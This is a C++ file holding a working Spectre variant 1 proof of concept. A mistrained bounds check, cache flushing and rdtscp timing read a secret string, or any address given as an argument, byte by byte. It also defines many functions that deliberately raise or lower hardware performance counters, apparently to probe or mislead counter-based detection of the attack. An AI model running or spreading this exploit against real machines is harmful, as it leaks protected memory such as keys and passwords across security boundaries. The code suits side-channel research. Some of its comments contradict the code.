#include <cstdio>
#include <cstdint>
#include <ctime>
#include <cstring>
#include <cmath>
#include <unistd.h>

#include <cstring>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt", on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

// /* sscanf_s only works in MSVC. sscanf should work with other compilers*/
#ifndef _MSC_VER
#define sscanf_s sscanf
#endif

#include "pfc.h"

/********************************************************************
Victim code.
********************************************************************/
int shared[4096 * 16];
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20};
uint8_t unused2[64];
uint8_t array2[256 * 512];

char const * secret = "The Magic Words are Squeamish Ossifrage.";

uint8_t temp = 0; /* Used so compiler won't optimize out victim_function() */

void victim_function(size_t x)
{
	// // PFC_TIC
	if (x < array1_size)
	{
		temp &= array2[array1[x] * 512];
	}
	// // PFC_TOC
}

/********************************************************************
Analysis code
********************************************************************/
#define CACHE_HIT_THRESHOLD 80 /* assume cache hit if time <= threshold */

double comp1(double num, int it);
double comp2(double num, int it);

double comp1(double num, int it) {
  if (num < 32)
    num = exp(num);
  else if (num < 65536) 
    num = num * num;
  else {
    int i = rand() % 2;
    if (i == 0)
      num = sqrt(num);
    else
      num = log(num);
  }
  return comp2(num, it - 1);
}

void inc_ins() {
	/*
	* Increase instruction count by adding delay loop
	*/
  register int i;
  long long junk = 0;
  for (i = 0; i < 1000000; i++)
    junk += i;
}

void dec_ins() {
	/*
	* Decrease instruction count by sleeping
	*/
	sleep(1);
}

void inc_stall_issue() {
  /*
  * Increase stall during issue by increasing data hazard
  */
  srand(time(0));
  register int i;
  for (i = 0; i < 1000000; i++) {
    int temp0 = rand();
    int temp1 = rand();
    shared[temp1] = sqrt(temp0);
    int temp2 = rand();
    int temp3 = rand();
    shared[temp3] = sqrt(temp2);
    int temp4 = rand();
    int temp5 = rand();
    shared[temp5] = sqrt(temp4);
    int temp6 = rand();
    int temp7 = rand();
    shared[temp7] = sqrt(temp6);
    int temp8 = rand();
    int temp9 = rand();
    shared[temp9] = sqrt(temp8);
  }
}

void dec_stall_issue() {
  /*
  * Decrease by executing fast instructions
  */
  register int i;
  long long junk = 0;
  for (i = 0; i < 1000000; i++)
    junk += i;
}

void inc_stall_retire() {
  /*
  * Increase stall during issue by increasing data hazard
  * The same as inc_stall_issue
  */
  srand(time(0));
  register int i;
  for (i = 0; i < 1000000; i++) {
    int temp0 = rand();
    int temp1 = rand();
    shared[temp1] = sqrt(temp0);
    int temp2 = rand();
    int temp3 = rand();
    shared[temp3] = sqrt(temp2);
    int temp4 = rand();
    int temp5 = rand();
    shared[temp5] = sqrt(temp4);
    int temp6 = rand();
    int temp7 = rand();
    shared[temp7] = sqrt(temp6);
    int temp8 = rand();
    int temp9 = rand();
    shared[temp9] = sqrt(temp8);
  }
}

void dec_stall_retire() {
  /*
  * Decrease by executing fast instructions
  * The same as dec_stall_issue
  */
  register int i;
  long long junk = 0;
  for (i = 0; i < 1000000; i++)
    junk += i;
}

void inc_cycles() {
  /*
  * Increase cycles by sleeping
  */
  sleep(1);
}

void dec_cycles() {
  /*
  * Decrease cycles by doing nothing
  */
  return ;
}

void inc_load() {
  /*
  * Increase load by loading, but maintaining miss rate
  */
  register int i;
  unsigned long long j;
  for (i = 0; i < 65536; i++)
    j += shared[i];
}

void dec_load() {
  /*
  * Decrease load by adding more other instructions
  */
  inc_ins();
}

void inc_dtlb_read() {
  /*
  * Increase DTLB read by reading different pages
  */
  int i, j;
  for (i = 0; i < 16; i++) {
    j = rand() % 4096 + 4096 * i;
    shared[j] = rand();
  }
}

void dec_dtlb_read() {
  /*
  * Decrease DTLB read by reading the same page
  */
  int i, j;
  for (i = 0; i < 16; i++) {
    j = rand() % 4096;
    shared[j] = rand();
  }
}

void inc_store() {
  /*
  * Increase memory store
  */
  register int i;
  for (int i = 0; i < 4096; i++) {
    shared[i] = rand();
  }
}

void dec_store() {
  /*
  * Decrease memory store by adding other instructions
  */
  inc_ins();
}

void inc_bpu_read() {
  /*
  * Increase BPU read by executing a loop
  */
  inc_ins();
}

void dec_bpu_read() {
  /*
  * Decrease BPU read by sleeping
  */
  sleep(1);
}

void inc_dtlb_write() {
  /*
  * Increase DTLB write by accessing different pages
  * The same as DTLB read
  */
  int i, j;
  for (i = 0; i < 16; i++) {
    j = rand() % 4096 + 4096 * i;
    shared[j] = rand();
  }
}

void dec_dtlb_write() {
  /*
  * Decrease DTLB write by accessing the same page
  * The same as DTLB read
  */
  int i, j;
  for (i = 0; i < 16; i++) {
    j = rand() % 4096;
    shared[j] = rand();
  }
}

void inc_branch() {
  /*
  * Increase branch number by executing a loop
  * The same as BPU read
  */
  inc_ins();
}

void dec_branch() {
  /*
  * Decrease branch number by sleeping
  * The same as BPU read
  */
  sleep(1);
}

void inc_l1d_miss() {
  /*
  * Increase L1D miss by accessing different cache lines
  */
  register int i;
  for (i = 0; i < 65536 / 64; i++)
    _mm_clflush(&shared[i * 64]);
  for (i = 0; i < 1000; i++) {
    int j = rand() % (65536 / 64);
    shared[j * 64] = rand();
  }
}

void dec_l1d_miss() {
  /*
  * Decrease L1D miss by access the same cache line
  */
  int i;
  unsigned long long j = 0;
  for (i = 0; i < 65536 / 64; i++) 
    j += shared[i % 16];
}

void inc_l1i_miss() {
  /*
  * Increase L1I miss by using two functions calling each other
  */
  double res = comp1(rand(), 100);
  shared[(int)res % 65536] = (int)res;
}

void dec_l1i_miss() {
  /*
  * Decrease L1I miss by executing the same code
  */
  inc_ins();
}

void inc_context_switch() {
  /*
  * Increase context switch by sleeping
  */
  register int i;
  for (i = 0; i < 1000; i++)
    sleep(0.001);
}

void dec_context_switch() {
  /*
  * Decrease context switch by increasing cycles in the current thread
  */
  inc_cycles();
}

double comp2(double num, int it) {
  int x = num, y = rand();
  return comp1((double)(x ^ y), it - 1);
}

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
{
	static int results[256];
	int tries, i, j, k, mix_i;
	unsigned int junk = 0;
	size_t training_x, x;
	register uint64_t time1, time2;
	volatile uint8_t* addr;

	for (i = 0; i < 256; i++)
		results[i] = 0;
	for (tries = 999; tries > 0; tries--)
	{
		/* Flush array2[256*(0..255)] from cache */
		for (i = 0; i < 256; i++)
			_mm_clflush(&array2[i * 512]); /* intrinsic for clflush instruction */

		/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x)
		 * */

		/* on a modern architecture, the training period needs to increase
		 * looks like the branch predictors have become more resilient ;-)
		 */
		training_x = tries % array1_size;
		for (j = 399; j >= 0; j--)
		{
			_mm_clflush(&array1_size);
			for (volatile int z = 0; z < 100; z++)
			{
			} /* Delay (can also mfence) */

			/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
			/* Avoid jumps in case those tip off the branch predictor */
			x = ((j % 20) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
			x = (x | (x >> 16)); /* Set x=-1 if j%6=0, else x=0 */
			x = training_x ^ (x & (malicious_x ^ training_x));
			/* Call the victim! */
			victim_function(x);
		}

		/* Time reads. Order is lightly mixed up to prevent stride prediction */
		PFC_TIC
		for (i = 0; i < 256; i++)
		{
			mix_i = ((i * 167) + 13) & 255;
			addr = &array2[mix_i * 512];
			time1 = __rdtscp(&junk); /* READ TIMER */
			junk = *addr; /* MEMORY ACCESS TO TIME */
			time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
			if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
				results[mix_i]++; /* cache hit - add +1 to score for this value */
		}
		PFC_TOC

		/* Locate highest & second-highest results results tallies in j/k */
		j = k = -1;
		for (i = 0; i < 256; i++)
		{
			if (j < 0 || results[i] >= results[j])
			{
				k = j;
				j = i;
			}
			else if (k < 0 || results[i] >= results[k])
			{
				k = i;
			}
		}
		if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
			break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
	}
	results[0] ^= junk; /* use junk so code above won't get optimized out*/
	value[0] = (uint8_t)j;
	score[0] = results[j];
	value[1] = (uint8_t)k;
	score[1] = results[k];
}

int main(int argc,
  const char * * argv) {
  // pfc_setup();
  size_t malicious_x = (size_t)(secret - (char * ) array1); /* default for malicious_x */
  int i, score[2], len = 40;
  uint8_t value[2];

	for (size_t i = 0; i < sizeof(array2); i++)
		array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
	if (argc == 3)
	{
		sscanf_s(argv[1], "%p", (void * *)(&malicious_x));
		malicious_x -= (size_t)array1; /* Convert input value into a pointer */
		sscanf_s(argv[2], "%d", &len);
		printf("Trying malicious_x = %p, len = %d\n", (void *)malicious_x, len);
	}

  printf("Reading %d bytes:\n", len);
  while (--len >= 0) {
    printf("Reading at malicious_x = %p... ", (void * ) malicious_x);
    readMemoryByte(malicious_x++, value, score);
    printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
    printf("0x%02X=’%c’ score=%d ", value[0],
      (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
    if (score[1] > 0)
      printf("(second best: 0x%02X score=%d)", value[1], score[1]);
    printf("\n");
  }
  // pfc_print();
  return (0);
}
